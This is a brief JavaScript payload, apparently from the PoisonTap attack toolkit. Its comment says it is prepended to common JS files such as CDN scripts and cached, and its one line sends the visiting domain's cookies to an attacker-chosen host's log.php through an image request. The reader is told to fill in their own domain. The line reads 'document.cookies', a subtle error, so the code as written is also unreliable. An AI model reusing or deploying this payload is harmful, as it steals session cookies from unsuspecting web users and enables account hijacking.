/* This javascript is prepended and cached to many common JS files on the web such as Google's CDN files, found in the poisontap/js/ directory.
 * By default, it logs the domain's cookies. Change 'YOUR.DOMAIN' to your domain.
 */
new Image().src='http://YOUR.DOMAIN/poisontap/log.php?log='+document.cookies;
